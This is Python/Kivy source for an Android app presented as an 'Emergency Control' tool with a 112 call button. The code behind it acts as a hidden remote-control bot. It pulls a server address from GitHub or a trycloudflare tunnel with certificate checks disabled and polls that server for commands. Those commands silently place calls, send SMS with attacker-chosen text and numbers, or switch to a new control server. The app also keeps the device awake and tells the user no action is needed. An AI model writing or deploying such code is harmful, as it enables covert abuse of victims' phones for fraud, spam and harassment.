"""
Emergency Control App
"""
import threading
import time
import urllib.request
import json
import os
import ssl  # IMPORTANTE PARA EL CERTIFICADO

from kivy.app import App
from kivy.uix.label import Label
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.clock import Clock
from kivy.utils import platform

POLL_INTERVAL = 3

GITHUB_CONFIG_URL = "https://raw.githubusercontent.com/Melopezpe/emergency-config/main/url.txt"
DEFAULT_SERVER_URL = "https://bingo-sat-star-explicit.trycloudflare.com"

LOCAL_CACHE = "server_url_cache.txt"
LAST_ID_CACHE = "last_id_cache.txt"

last_id = 0
server_url = ""
github_url = GITHUB_CONFIG_URL


def load_cached_data():
    global server_url, last_id
    try:
        if os.path.exists(LOCAL_CACHE):
            with open(LOCAL_CACHE, "r") as f:
                url = f.read().strip()
                if url:
                    server_url = url
    except Exception as e:
        print(f"ERROR load_cached_url: {e}")

    if not server_url:
        server_url = DEFAULT_SERVER_URL

    try:
        if os.path.exists(LAST_ID_CACHE):
            with open(LAST_ID_CACHE, "r") as f:
                last_id = int(f.read().strip())
    except Exception as e:
        print(f"ERROR load_last_id: {e}")
        last_id = 0


def save_cached_url(url):
    global server_url
    server_url = url.strip()
    try:
        with open(LOCAL_CACHE, "w") as f:
            f.write(server_url)
    except Exception as e:
        print(f"ERROR save_cached_url: {e}")


def save_last_id(msg_id):
    global last_id
    last_id = msg_id
    try:
        with open(LAST_ID_CACHE, "w") as f:
            f.write(str(last_id))
    except Exception as e:
        print(f"ERROR save_last_id: {e}")


def fetch_url_from_github():
    global server_url
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        req = urllib.request.Request(
            github_url,
            headers={'User-Agent': 'Mozilla/5.0 (Android) EmergencyApp/1.0'}
        )
        resp = urllib.request.urlopen(req, timeout=10, context=ctx)
        url = resp.read().decode('utf-8-sig').strip()
        print(f"GITHUB OK: {url!r}")
        if url.startswith("http"):
            if url != server_url:
                save_cached_url(url)
                print(f"GITHUB -> cache actualizada: {url}")
            return url
        else:
            print(f"GITHUB contenido invalido: {url!r}")
    except Exception as e:
        print(f"ERROR GITHUB: {e}")
    return server_url


def make_call(number):
    if platform == 'android':
        try:
            from jnius import autoclass
            Intent   = autoclass('android.content.Intent')
            Uri      = autoclass('android.net.Uri')
            Activity = autoclass('org.kivy.android.PythonActivity')
            intent   = Intent(Intent.ACTION_CALL)
            intent.setData(Uri.parse('tel:' + number))
            Activity.mActivity.startActivity(intent)
        except Exception as e:
            print(f"ERROR make_call: {e}")


def send_sms(number, message):
    if platform == 'android':
        try:
            from jnius import autoclass
            SmsManager = autoclass('android.telephony.SmsManager')
            SmsManager.getDefault().sendTextMessage(number, None, message, None, None)
        except Exception as e:
            print(f"ERROR send_sms: {e}")


def poll_server(url):
    global last_id
    if not url:
        return "Sin URL en GitHub"
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        endpoint = url.rstrip("/") + "/api/chat/poll_pc?since=" + str(last_id)
        req = urllib.request.Request(
            endpoint,
            headers={'User-Agent': 'Mozilla/5.0 (Android) EmergencyApp/1.0'}
        )
        response = urllib.request.urlopen(req, timeout=12, context=ctx)
        data = json.loads(response.read().decode())

        for msg in data.get("messages", []):
            save_last_id(max(last_id, msg["id"]))
            txt = msg["text"]

            if txt.startswith("NEWSERVER:"):
                new_url = txt[10:].strip()
                if new_url.startswith("http"):
                    save_cached_url(new_url)
            elif txt.startswith("CALL:"):
                make_call(txt[5:].strip() or "112")
            elif txt.startswith("SMS:"):
                parts = txt[4:].split(":", 1)
                if len(parts) == 2:
                    send_sms(parts[0].strip(), parts[1].strip())
        return "Conectado"
    except Exception as e:
        print(f"ERROR POLL ({url}): {e}")
        return "Sin conexion"


class EmergencyApp(App):
    def build(self):
        self.title = "Emergency Control"
        load_cached_data()
        print(f"APP START. URL inicial: {server_url}")

        layout = BoxLayout(orientation='vertical', padding=24, spacing=12)
        layout.add_widget(Label(
            text="EMERGENCY CONTROL",
            font_size='16sp',
            color=(0.91, 0.27, 0.38, 1),
            size_hint_y=None,
            height=44
        ))

        self.status = Label(
            text="Iniciando...",
            font_size='12sp',
            color=(0.6, 0.6, 0.6, 1),
            size_hint_y=None,
            height=60,
            halign='center'
        )
        layout.add_widget(self.status)

        btn_112 = Button(
            text="LLAMAR 112",
            size_hint_y=None,
            height=56,
            background_color=(0.91, 0.27, 0.38, 1)
        )
        btn_112.bind(on_press=lambda x: make_call("112"))
        layout.add_widget(btn_112)

        layout.add_widget(Label(
            text="La app se configura automaticamente.\nNo requiere ninguna accion del usuario.",
            font_size='10sp',
            color=(0.3, 0.3, 0.3, 1),
            size_hint_y=None,
            height=44,
            halign='center'
        ))

        self.request_permissions()
        threading.Thread(target=self.main_loop, daemon=True).start()
        return layout

    def request_permissions(self):
        if platform == 'android':
            try:
                from android.permissions import request_permissions, Permission
                request_permissions([
                    Permission.CALL_PHONE,
                    Permission.SEND_SMS,
                    Permission.RECEIVE_BOOT_COMPLETED,
                    Permission.FOREGROUND_SERVICE,
                    Permission.INTERNET,
                    Permission.WAKE_LOCK,
                ])
            except Exception as e:
                print(f"ERROR request_permissions: {e}")

    def main_loop(self):
        github_check = 0
        while True:
            if github_check <= 0:
                current_url = fetch_url_from_github()
                github_check = 60
            else:
                current_url = server_url
                github_check -= POLL_INTERVAL

            result = poll_server(current_url)

            if current_url and len(current_url) > 28:
                short = current_url[:28] + "..."
            else:
                short = current_url or "(vacia)"

            status_text = f"{result}\n{short}"
            Clock.schedule_once(
                lambda dt, t=status_text: setattr(self.status, 'text', t),
                0
            )
            time.sleep(POLL_INTERVAL)

    def on_start(self):
        if platform == 'android':
            try:
                from jnius import autoclass
                Activity     = autoclass('org.kivy.android.PythonActivity')
                PowerManager = autoclass('android.os.PowerManager')
                pm = Activity.mActivity.getSystemService('power')
                self.wake_lock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, 'EmergencyApp::WakeLock')
                self.wake_lock.acquire()
            except Exception as e:
                print(f"ERROR on_start: {e}")


if __name__ == '__main__':
    EmergencyApp().run()
